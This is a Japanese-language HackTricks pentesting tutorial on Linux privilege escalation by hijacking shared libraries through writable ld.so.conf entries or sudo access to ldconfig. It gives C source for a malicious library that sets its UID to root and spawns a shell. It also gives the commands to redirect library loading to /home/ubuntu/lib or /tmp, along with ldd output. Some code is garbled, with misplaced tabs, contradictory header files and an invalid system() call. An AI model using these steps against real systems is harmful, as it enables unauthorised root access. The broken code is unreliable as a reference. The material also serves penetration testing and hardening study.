# ld.so特権昇格のエクスプロイト例

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 環境の準備

次のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます。

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

```c
#include <stdio.h>

void custom_function() {
    printf("This is a custom function\n");
}
```

このファイルは、`custom_function`という名前のカスタム関数を含んでいます。
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Japanese" %}
1. 同じフォルダにこれらのファイルを**作成**します
2. **ライブラリ**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so`を`/usr/lib`に**コピー**します: `sudo cp libcustom.so /usr/lib` (root権限)
4. **実行可能ファイル**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`

### 環境を確認する

_libcustom.so_が_/usr/lib_から**ロード**されていること、およびバイナリを**実行**できることを確認します。
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Exploit

このシナリオでは、**誰かが`/etc/ld.so.conf/`内のファイルに脆弱なエントリを作成した**と仮定します。
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
脆弱なフォルダは_/home/ubuntu/lib_です（書き込みアクセスがあります）。\
次のコードをそのパス内に**ダウンロードしてコンパイル**してください：
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
いま、誤構成されたパス内に**悪意のあるlibcustomライブラリを作成**したので、**再起動**またはrootユーザーが**`ldconfig`**を実行するのを待つ必要があります（_sudoでこのバイナリを実行できるか、またはsuidビットがある場合は自分で実行できます_）。

これが起こった後、`sharevuln`実行ファイルが`libcustom.so`ライブラリをどこからロードしているかを**再確認**してください：
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
次に示すように、**`/home/ubuntu/lib`から読み込んでいます**。ユーザーが実行すると、シェルが実行されます。
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
この例では特権を昇格させていませんが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで特権を昇格させることができます。
{% endhint %}

### 他の設定ミス - 同じ脆弱性

前の例では、管理者が`/etc/ld.so.conf.d/`内の設定ファイルに**特権のないフォルダを設定**したという設定ミスを偽装しました。\
しかし、`/etc/ld.so.conf.d`内のいくつかの**設定ファイル**、`/etc/ld.so.conf.d`フォルダ、または`/etc/ld.so.conf`ファイルに**書き込み権限**がある場合、同じ脆弱性が発生する他の設定ミスがあります。

## Exploit 2

**`ldconfig`に対してsudo特権を持っているとします**。\
`ldconfig`に**どこからconfファイルをロードするか**を指定できるため、`ldconfig`が任意のフォルダをロードするように利用することができます。\
では、"/tmp"をロードするために必要なファイルとフォルダを作成しましょう。
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
次に、**前のエクスプロイト**で示されたように、**`/tmp`内に悪意のあるライブラリを作成**します。\
そして最後に、パスをロードしてバイナリがライブラリをどこからロードしているかを確認しましょう。
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**sudo権限を持つことで、同じ脆弱性を悪用することができます。**

{% hint style="info" %}
`ldconfig`が**suidビット**で設定されている場合、この脆弱性を悪用する信頼性のある方法は見つかりませんでした。次のエラーが表示されます：`/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## 参考文献

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* HTBのDabマシン

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
